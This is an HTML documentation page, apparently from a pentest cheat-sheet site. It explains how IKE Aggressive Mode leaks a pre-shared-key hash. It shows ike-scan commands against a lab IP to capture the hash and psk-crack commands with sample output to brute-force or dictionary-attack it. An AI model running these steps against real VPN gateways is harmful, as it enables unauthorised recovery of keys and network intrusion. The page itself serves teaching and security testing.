@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Aggressive Mode VPN -- IKE-Scan, PSK-Crack - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Aggressive Mode VPN -- IKE-Scan, PSK-Crack", url: "#_top", children: [
+              {title: "$ sudo ike-scan -A 192.168.207.134 Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ikescan/) 192.168.207.134 Aggressive Mode Handshake returned HDR=(CKY-R=f320d6XXXXXXXX) SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=12f5f28cXXXXXXXXXXXXXXX (Cisco Unity) VID=afcad71368a1XXXXXXXXXXXXXXX(Dead Peer Detection v1.0) VID=06e7719XXXXXXXXXXXXXXXXXXXXXX VID=090026XXXXXXXXXX (XAUTH) KeyExchange(128 bytes) ID(Type=ID_IPV4_ADDR, Value=192.168.207.134) Nonce(20 bytes) Hash(16 bytes)", url: "#sudo-ike-scan-a-192168207134-starting-ike-scan-19-with-1-hosts-httpwwwnta-monitorcomtoolsikescan-192168207134-aggressive-mode-handshake-returned-hdrcky-rf320d6xxxxxxxx-saenc3des-hashmd5-group2modp1024-authpsk-lifetypeseconds-lifeduration28800-vid12f5f28cxxxxxxxxxxxxxxx-cisco-unity-vidafcad71368a1xxxxxxxxxxxxxxxdead-peer-detection-v10-vid06e7719xxxxxxxxxxxxxxxxxxxxxx-vid090026xxxxxxxxxx-xauth-keyexchange128-bytes-idtypeid_ipv4_addr-value192168207134-nonce20-bytes-hash16-bytes" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="aggressive-mode-vpn-ike-scan-psk-crack">Aggressive Mode VPN -- IKE-Scan, PSK-Crack</h1>
+<p>In IKE Aggressive mode the authentication hash based on a preshared key (PSK) is transmitted as response to the initial packet of a vpn client that wants to establish an IPSec Tunnel (Hash_R). This hash is not encrypted. It's possible to capture these packets using a sniffer, for example tcpdump and start dictionary or brute force attack against this hash to recover the PSK.</p>
+<p>This attack only works in IKE aggressive mode because in IKE Main Mode the hash is already encrypted. Based on such facts IKE aggressive mode is not very secure.</p>
+<p>It looks like this:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$ ike-scan 192.168.207.134
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>192.168.207.134 Notify message 14 (NO-PROPOSAL-CHOSEN) HDR=(CKY-R=f320d682d5c73797)
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Ending ike-scan 1.9: 1 hosts scanned in 0.096 seconds (10.37 hosts/sec).
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>0 returned handshake; 1 returned notify
+</span></code></pre></div></p>
+<hr />
+<h2 id="sudo-ike-scan-a-192168207134-starting-ike-scan-19-with-1-hosts-httpwwwnta-monitorcomtoolsikescan-192168207134-aggressive-mode-handshake-returned-hdrcky-rf320d6xxxxxxxx-saenc3des-hashmd5-group2modp1024-authpsk-lifetypeseconds-lifeduration28800-vid12f5f28cxxxxxxxxxxxxxxx-cisco-unity-vidafcad71368a1xxxxxxxxxxxxxxxdead-peer-detection-v10-vid06e7719xxxxxxxxxxxxxxxxxxxxxx-vid090026xxxxxxxxxx-xauth-keyexchange128-bytes-idtypeid_ipv4_addr-value192168207134-nonce20-bytes-hash16-bytes"><div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$ sudo ike-scan -A 192.168.207.134
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ikescan/)
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>192.168.207.134 Aggressive Mode Handshake returned HDR=(CKY-R=f320d6XXXXXXXX) SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=12f5f28cXXXXXXXXXXXXXXX (Cisco Unity) VID=afcad71368a1XXXXXXXXXXXXXXX(Dead Peer Detection v1.0) VID=06e7719XXXXXXXXXXXXXXXXXXXXXX VID=090026XXXXXXXXXX (XAUTH) KeyExchange(128 bytes) ID(Type=ID_IPV4_ADDR, Value=192.168.207.134) Nonce(20 bytes) Hash(16 bytes)
+</span></code></pre></div></h2>
+<p>To save with some output:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$ sudo ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key
+</span></code></pre></div>
+Once you have you psk file to crack you're stuck with two options psk-crack and cain</p>
+<hr />
+<p>Brute force:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$psk-crack -b 5 192-168-207-134key
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Running in brute-force cracking mode
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Brute force with 36 chars up to length 5 will take up to 60466176 iterations
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>no match found for MD5 hash 5c178d[SNIP]
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Ending psk-crack: 60466176 iterations in 138.019 seconds (438099.56 iterations/sec)
+</span></code></pre></div>
+Default is charset is "0123456789abcdefghijklmnopqrstuvwxyz" can be changed with --charset=
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$ psk-crack -b 5 --charset=&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key
+</span></code></pre></div>
+Running in brute-force cracking modde
+Brute force with 63 chars up to length 5 will take up to 992436543 iterations</p>
+<hr />
+<p>Dictionary attack:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$psk-crack -d /path/to/dictionary 192-168-207-134key
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Running in dictionary cracking mode
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>no match found for MD5 hash 5c178d[SNIP]
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>Ending psk-crack: 14344876 iterations in 33.400 seconds (429483.14 iterations/sec)
+</span></code></pre></div></p>
+<hr />
+<p>References: http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/ikescan.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
